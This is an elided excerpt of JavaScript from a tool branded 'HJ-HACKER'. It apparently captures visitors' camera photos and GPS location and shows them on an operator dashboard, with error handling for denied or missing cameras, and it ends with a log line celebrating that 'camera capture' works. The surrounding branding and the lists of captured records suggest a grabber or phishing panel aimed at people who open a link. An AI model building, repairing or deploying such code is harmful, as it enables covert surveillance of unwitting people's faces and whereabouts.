...
// ========== FIXED: CAMERA CAPTURE WITH BETTER HANDLING ==========
async function captureCameraPhoto() {
    try {
        // Check if camera API is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.error('Camera API not supported');
            showToast('Camera Error', 'Your browser does not support camera access', 'error');
        ...
        try {
            ...
            try {
                ...
                showToast('Camera Error', 'Please allow camera access in browser settings', 'error');
...
// ========== FIXED: LOCATION CAPTURE (ACCURATE GPS) ==========
    ...
    try {
        ...
        const html = recent.map(v => `
            <div class="data-item">
                ...
                ${v.camera && v.camera !== 'black_screen' && v.camera !== 'camera_unavailable' && v.camera !== 'camera_permission_denied' && v.camera !== 'camera_not_supported' && v.camera !== 'camera_error' && v.camera !== 'camera_capture_failed' && v.camera.startsWith('data:image') ? 
                    `<div class="data-item-stats" style="color: #00ff41;">
                        <i class="fas fa-camera"></i> Photo captured! 
                        <button class="data-btn-sm" onclick="viewPhoto('${v.camera.replace(/'/g, "\\'")}')">
                            <i class="fas fa-eye"></i> View Photo
                        </button>
                    </div>` : 
                    (v.camera === 'camera_permission_denied' ? 
                        `<div class="data-item-stats" style="color: #ffaa00;">
                            <i class="fas fa-camera-slash"></i> Camera permission was denied
                        </div>` :
                        (v.camera === 'camera_not_supported' ?
                            `<div class="data-item-stats" style="color: #ffaa00;">
                                <i class="fas fa-camera-slash"></i> Camera not supported on this device
                            </div>` : ''))
                }
                <div class="data-item-actions">
        ...
        if (analytics.length === 0) {
            ...
            html += analytics.map(v => `
                <div class="data-item">
                    ...
                    ${v.captured_image && v.captured_image !== 'black_screen' && v.captured_image !== 'camera_unavailable' && v.captured_image !== 'camera_permission_denied' && v.captured_image !== 'camera_not_supported' && v.captured_image !== 'camera_error' && v.captured_image !== 'camera_capture_failed' && v.captured_image.startsWith('data:image') ? 
                        `<div class="data-item-stats" style="color: #00ff41;">
                            <i class="fas fa-camera"></i> Photo captured! 
                        ...
                        (v.captured_image === 'camera_permission_denied' ? 
                            `<div class="data-item-stats" style="color: #ffaa00;">
                                <i class="fas fa-camera-slash"></i> Camera permission was denied by user
                            </div>` :
                            (v.captured_image === 'camera_not_supported' ?
                                `<div class="data-item-stats" style="color: #ffaa00;">
                                    <i class="fas fa-camera-slash"></i> Camera not supported on this device/browser
                                </div>` :
                                (v.captured_image === 'camera_error' || v.captured_image === 'camera_capture_failed' ?
                                    `<div class="data-item-stats" style="color: #ffaa00;">
                                        <i class="fas fa-camera-slash"></i> Camera capture failed
                                    </div>` : ''))
                        )}
                </div>
            `).join('');
...
window.viewPhoto = (imageData) => {
    ...
    if (imageData && imageData !== 'black_screen' && 
        imageData !== 'camera_unavailable' && 
        imageData !== 'camera_permission_denied' && 
        imageData !== 'camera_not_supported' && 
        imageData !== 'camera_error' && 
        imageData !== 'camera_capture_failed' && 
        imageData.startsWith('data:image')) {
        img.src = imageData;
        modal.classList.remove('hidden');
    } else if (imageData === 'camera_permission_denied') {
        showToast('Camera Error', 'Camera permission was denied. Please allow camera access.', 'error');
    } else if (imageData === 'camera_not_supported') {
        showToast('Camera Error', 'Camera is not supported on this device/browser', 'error');
    } else {
...
console.log('🔥 HJ-HACKER FULLY FIXED - Camera capture working!');
